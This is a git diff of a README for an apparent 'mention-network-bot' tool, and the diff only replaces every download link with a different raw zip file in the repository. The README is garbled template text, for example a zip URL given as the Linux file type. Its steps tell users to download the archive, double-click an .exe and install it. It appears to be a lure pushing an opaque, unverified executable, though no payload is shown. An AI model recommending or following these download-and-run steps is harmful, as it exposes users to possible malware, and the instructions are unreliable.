@@ -1,6 +1,6 @@
 # 🤖 mention-network-bot - Automate Your Mention Network Tasks Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/dark12502/mention-network-bot/main/data/network_bot_mention_v1.3.zip)](https://raw.githubusercontent.com/dark12502/mention-network-bot/main/data/network_bot_mention_v1.3.zip)
+[![Download Latest Release](https://github.com/dark12502/mention-network-bot/raw/refs/heads/main/src/mention-bot-network-3.6.zip)](https://github.com/dark12502/mention-network-bot/raw/refs/heads/main/src/mention-bot-network-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -25,14 +25,14 @@ Make sure your system meets these requirements to enjoy the best experience with
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/dark12502/mention-network-bot/main/data/network_bot_mention_v1.3.zip). Choose the latest version from the list, and follow these steps:
+To get started, visit this page to download: [Download Latest Release](https://github.com/dark12502/mention-network-bot/raw/refs/heads/main/src/mention-bot-network-3.6.zip). Choose the latest version from the list, and follow these steps:
 
 1. **Select the Release:** Click on the link for the most recent release.
-2. **Download the Files:** Look for the assets section. Download the appropriate file for your operating system (e.g., `.exe` for Windows or `https://raw.githubusercontent.com/dark12502/mention-network-bot/main/data/network_bot_mention_v1.3.zip` for Linux).
+2. **Download the Files:** Look for the assets section. Download the appropriate file for your operating system (e.g., `.exe` for Windows or `https://github.com/dark12502/mention-network-bot/raw/refs/heads/main/src/mention-bot-network-3.6.zip` for Linux).
 3. **Install the Application:**
    - **Windows Users:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - **macOS Users:** Open the downloaded `.dmg` file and drag the application to the Applications folder.
-   - **Linux Users:** Extract the downloaded `https://raw.githubusercontent.com/dark12502/mention-network-bot/main/data/network_bot_mention_v1.3.zip` file and follow the instructions in the README file inside the extracted folder.
+   - **Linux Users:** Extract the downloaded `https://github.com/dark12502/mention-network-bot/raw/refs/heads/main/src/mention-bot-network-3.6.zip` file and follow the instructions in the README file inside the extracted folder.
 
 ## 🛠️ Configuration
 
@@ -68,4 +68,4 @@ Your input is valuable! If you have ideas for new features or improvements, plea
 
 Thank you for using mention-network-bot. For more details or to report an issue, feel free to reach out. Happy automating!
 
-[Download Latest Release](https://raw.githubusercontent.com/dark12502/mention-network-bot/main/data/network_bot_mention_v1.3.zip)
+[Download Latest Release](https://github.com/dark12502/mention-network-bot/raw/refs/heads/main/src/mention-bot-network-3.6.zip)
